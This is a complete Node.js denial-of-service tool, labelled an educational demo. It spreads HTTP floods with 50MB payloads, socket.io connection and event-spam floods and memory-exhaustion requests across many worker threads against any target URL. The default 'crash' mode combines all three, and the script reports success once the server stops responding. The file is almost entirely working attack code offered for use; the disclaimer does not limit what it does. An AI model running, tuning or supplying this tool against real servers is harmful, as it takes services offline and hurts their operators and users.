#!/usr/bin/env node

/**
 * DDoS Attack Demo Script for Educational Purposes
 * WARNING: Only use this against your own servers for testing!
 * Using this against servers you don't own is illegal.
 */

import http from 'http'
import { io } from 'socket.io-client'
import { Worker, isMainThread, parentPort, workerData } from 'worker_threads'
import { performance } from 'perf_hooks'
import { fileURLToPath } from 'url'
import { dirname } from 'path'

const __filename = fileURLToPath(import.meta.url)
const __dirname = dirname(__filename)

const TARGET_URL = process.env.TARGET_URL || 'http://127.0.0.1:3000'
const SOCKET_TARGET = process.env.SOCKET_TARGET || TARGET_URL

class DDoSAttack {
    constructor(options = {}) {
        this.target = options.target || TARGET_URL
        this.socketTarget = options.socketTarget || SOCKET_TARGET
        this.workers = options.workers || 12 // Increased workers for more pressure
        this.requestsPerSecond = options.requestsPerSecond || 1000 // Much higher RPS
        this.duration = options.duration || 60 // Longer duration
        this.attackType = options.attackType || 'crash' // 'http', 'socket', 'mixed', 'crash'
        this.running = false
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            serverErrors: 0,
            timeouts: 0,
            connectionRefused: 0,
            startTime: null,
            endTime: null
        }
    }

    async start() {
        console.log('💥 Starting ENHANCED DDoS Attack Demo')
        console.log('═══════════════════════════════════════════')
        console.log(`🎯 Target: ${this.target}`)
        console.log(`🚀 Attack Type: ${this.attackType.toUpperCase()}`)
        console.log(`👥 Workers: ${this.workers}`)
        console.log(`⚡ Requests/sec: ${this.requestsPerSecond}`)
        console.log(`⏱️  Duration: ${this.duration}s`)
        console.log('⚠️  WARNING: This WILL crash the server!')
        console.log('═══════════════════════════════════════════')

        this.running = true
        this.stats.startTime = performance.now()

        // Start progress monitor
        this.startProgressMonitor()

        // Start worker threads for parallel attacks
        const promises = []
        for (let i = 0; i < this.workers; i++) {
            promises.push(this.startWorker(i))
        }

        // Run attack for specified duration
        setTimeout(() => {
            this.stop()
        }, this.duration * 1000)

        await Promise.all(promises)
        this.printResults()
    }

    startProgressMonitor() {
        const startTime = Date.now()
        const monitor = setInterval(() => {
            if (!this.running) {
                clearInterval(monitor)
                return
            }
            
            const elapsed = (Date.now() - startTime) / 1000
            const remaining = this.duration - elapsed
            const rps = this.stats.totalRequests / elapsed || 0
            const errorRate = (this.stats.failedRequests / this.stats.totalRequests * 100) || 0
            
            process.stdout.write(`\r🔥 ${elapsed.toFixed(1)}s | RPS: ${rps.toFixed(0)} | Errors: ${errorRate.toFixed(1)}% | Remaining: ${remaining.toFixed(1)}s`)
        }, 500)
    }

    async startWorker(workerId) {
        return new Promise((resolve) => {
            const worker = new Worker(__filename, {
                workerData: {
                    workerId,
                    target: this.target,
                    socketTarget: this.socketTarget,
                    requestsPerSecond: Math.floor(this.requestsPerSecond / this.workers),
                    attackType: this.attackType,
                    duration: this.duration
                }
            })

            worker.on('message', (data) => {
                if (data.type === 'stats') {
                    this.stats.totalRequests += data.totalRequests
                    this.stats.successfulRequests += data.successfulRequests
                    this.stats.failedRequests += data.failedRequests
                    this.stats.serverErrors += data.serverErrors || 0
                    this.stats.timeouts += data.timeouts || 0
                    this.stats.connectionRefused += data.connectionRefused || 0
                }
            })

            worker.on('exit', () => {
                resolve()
            })
        })
    }

    stop() {
        this.running = false
        this.stats.endTime = performance.now()
        console.log('\n\n🛑 Stopping attack...')
        console.log('📊 Checking server status...')
        
        // Quick health check to see if server is still responding
        this.checkServerHealth()
    }

    async checkServerHealth() {
        try {
            const start = Date.now()
            const response = await fetch(this.target, { 
                method: 'GET',
                signal: AbortSignal.timeout(5000)
            })
            const responseTime = Date.now() - start
            
            if (response.ok) {
                console.log(`✅ Server still responding (${responseTime}ms)`)
            } else {
                console.log(`⚠️ Server responding with errors (${response.status})`)
            }
        } catch (error) {
            if (error.name === 'AbortError') {
                console.log('💀 Server TIMEOUT - Likely crashed or overloaded!')
            } else {
                console.log('💀 Server UNREACHABLE - Attack successful!')
            }
        }
    }

    printResults() {
        const duration = (this.stats.endTime - this.stats.startTime) / 1000
        const totalRequests = this.stats.totalRequests
        const successRate = ((this.stats.successfulRequests / totalRequests) * 100) || 0
        const errorRate = ((this.stats.failedRequests / totalRequests) * 100) || 0
        
        console.log('\n═══════════════════════════════════════════')
        console.log('📊 ATTACK RESULTS:')
        console.log('═══════════════════════════════════════════')
        console.log(`⏱️  Duration: ${duration.toFixed(2)}s`)
        console.log(`🚀 Total Requests: ${totalRequests.toLocaleString()}`)
        console.log(`✅ Successful: ${this.stats.successfulRequests.toLocaleString()} (${successRate.toFixed(1)}%)`)
        console.log(`❌ Failed: ${this.stats.failedRequests.toLocaleString()} (${errorRate.toFixed(1)}%)`)
        console.log(`💥 Server Errors (5xx): ${this.stats.serverErrors.toLocaleString()}`)
        console.log(`⏰ Timeouts: ${this.stats.timeouts.toLocaleString()}`)
        console.log(`🚫 Connection Refused: ${this.stats.connectionRefused.toLocaleString()}`)
        console.log(`📈 Avg RPS: ${(totalRequests / duration).toFixed(0)}`)
        
        // Determine attack effectiveness
        if (this.stats.connectionRefused > totalRequests * 0.3) {
            console.log('🎯 ATTACK STATUS: SERVER CRASHED! 💀')
        } else if (this.stats.serverErrors > totalRequests * 0.2) {
            console.log('🎯 ATTACK STATUS: SERVER SEVERELY DEGRADED! ⚠️')
        } else if (errorRate > 50) {
            console.log('🎯 ATTACK STATUS: SERVER UNDER HEAVY STRESS! 🔥')
        } else {
            console.log('🎯 ATTACK STATUS: Limited impact - increase workers/RPS 📈')
        }
        console.log('═══════════════════════════════════════════')
    }
}

// Worker thread code
if (!isMainThread) {
    const { workerId, target, socketTarget, requestsPerSecond, attackType, duration } = workerData
    
    let stats = {
        totalRequests: 0,
        successfulRequests: 0,
        failedRequests: 0,
        serverErrors: 0,
        timeouts: 0,
        connectionRefused: 0
    }

    // Enhanced HTTP flood with larger payloads and keep-alive abuse
    async function httpFlood() {
        return new Promise((resolve) => {
            const largePayload = 'x'.repeat(1024 * 1024 * 50) // 50MB payload (was 10KB)
            const postData = JSON.stringify({
                attack: largePayload,
                timestamp: Date.now(),
                worker: workerId
            })

            const req = http.request(target, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(postData),
                    'Connection': 'keep-alive',
                    'User-Agent': 'DDoS-Attack-Bot'
                }
            }, (res) => {
                stats.totalRequests++
                if (res.statusCode >= 500) {
                    stats.serverErrors++
                    stats.failedRequests++
                } else if (res.statusCode === 200) {
                    stats.successfulRequests++
                } else {
                    stats.failedRequests++
                }
                res.on('data', () => {}) // consume response
                res.on('end', resolve)
            })

            req.on('error', (err) => {
                stats.totalRequests++
                if (err.code === 'ECONNREFUSED') {
                    stats.connectionRefused++
                } else if (err.code === 'ETIMEDOUT') {
                    stats.timeouts++
                }
                stats.failedRequests++
                resolve()
            })

            req.setTimeout(3000, () => {
                req.destroy()
                stats.totalRequests++
                stats.timeouts++
                stats.failedRequests++
                resolve()
            })

            req.write(postData)
            req.end()
        })
    }

    // Enhanced socket flood with resource exhaustion
    async function socketFlood() {
        return new Promise((resolve) => {
            try {
                const connections = []
                
                // Create multiple connections rapidly
                for (let i = 0; i < 5; i++) {
                    const socket = io(socketTarget, {
                        timeout: 2000,
                        forceNew: true,
                        transports: ['websocket', 'polling']
                    })

                    connections.push(socket)

                    socket.on('connect', () => {
                        stats.totalRequests++
                        stats.successfulRequests++
                        
                        // Spam multiple events rapidly
                        const spamInterval = setInterval(() => {
                            try {
                                socket.emit('join-room', { roomId: `spam${Math.random()}`, token: 'fake', color: 'white' })
                                socket.emit('find-room')
                                socket.emit('get-rooms')
                                socket.emit('create-room', { time: 600, rated: true, isPublic: true })
                                socket.emit('move', { from: { x: 0, y: 0 }, to: { x: 1, y: 1 } })
                            } catch (e) {
                                clearInterval(spamInterval)
                            }
                        }, 50)
                        
                        setTimeout(() => clearInterval(spamInterval), 1000)
                    })

                    socket.on('connect_error', () => {
                        stats.totalRequests++
                        stats.failedRequests++
                        stats.connectionRefused++
                    })
                }

                setTimeout(() => {
                    connections.forEach(socket => {
                        try {
                            socket.disconnect()
                        } catch (e) {}
                    })
                    resolve()
                }, 2000)

            } catch (error) {
                stats.totalRequests++
                stats.failedRequests++
                resolve()
            }
        })
    }

    // Memory exhaustion attack
    async function memoryExhaustion() {
        return new Promise((resolve) => {
            const largePayload = 'A'.repeat(100000) // 100KB
            const promises = []
            
            for (let i = 0; i < 10; i++) {
                const promise = new Promise((res) => {
                    const req = http.request(target, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Content-Length': Buffer.byteLength(largePayload)
                        }
                    }, (response) => {
                        stats.totalRequests++
                        if (response.statusCode >= 500) {
                            stats.serverErrors++
                        } else if (response.statusCode === 200) {
                            stats.successfulRequests++
                        }
                        response.on('data', () => {})
                        response.on('end', res)
                    })

                    req.on('error', () => {
                        stats.totalRequests++
                        stats.failedRequests++
                        res()
                    })

                    req.setTimeout(5000, () => {
                        req.destroy()
                        stats.totalRequests++
                        stats.timeouts++
                        res()
                    })

                    req.write(largePayload)
                    req.end()
                })
                promises.push(promise)
            }

            Promise.all(promises).then(resolve)
        })
    }

    // Crash attack - combines all vectors
    async function crashAttack() {
        const attacks = [httpFlood(), socketFlood(), memoryExhaustion()]
        await Promise.all(attacks)
    }

    async function mixedAttack() {
        const rand = Math.random()
        if (rand < 0.3) {
            await httpFlood()
        } else if (rand < 0.6) {
            await socketFlood()
        } else {
            await memoryExhaustion()
        }
    }

    // Attack loop
    const interval = 1000 / requestsPerSecond
    let attackFunction
    
    switch (attackType) {
        case 'http':
            attackFunction = httpFlood
            break
        case 'socket':
            attackFunction = socketFlood
            break
        case 'memory':
            attackFunction = memoryExhaustion
            break
        case 'crash':
            attackFunction = crashAttack
            break
        case 'mixed':
        default:
            attackFunction = mixedAttack
            break
    }

    const attackInterval = setInterval(async () => {
        await attackFunction()
    }, Math.max(interval, 10)) // Minimum 10ms interval for maximum speed

    // Stop after duration
    setTimeout(() => {
        clearInterval(attackInterval)
        parentPort.postMessage({ type: 'stats', ...stats })
        process.exit(0)
    }, duration * 1000)

    console.log(`💀 Worker ${workerId} started - Attack type: ${attackType}`)
}

// Main execution
if (isMainThread) {
    const args = process.argv.slice(2)
    const options = {}

    // Parse command line arguments
    for (let i = 0; i < args.length; i += 2) {
        const key = args[i].replace('--', '')
        const value = args[i + 1]
        
        if (key === 'workers') options.workers = parseInt(value)
        if (key === 'rps') options.requestsPerSecond = parseInt(value)
        if (key === 'duration') options.duration = parseInt(value)
        if (key === 'type') options.attackType = value
        if (key === 'target') options.target = value
        if (key === 'socketTarget') options.socketTarget = value
    }

    const attack = new DDoSAttack(options)
    
    process.on('SIGINT', () => {
        attack.stop()
        process.exit(0)
    })

    attack.start()
}

export default DDoSAttack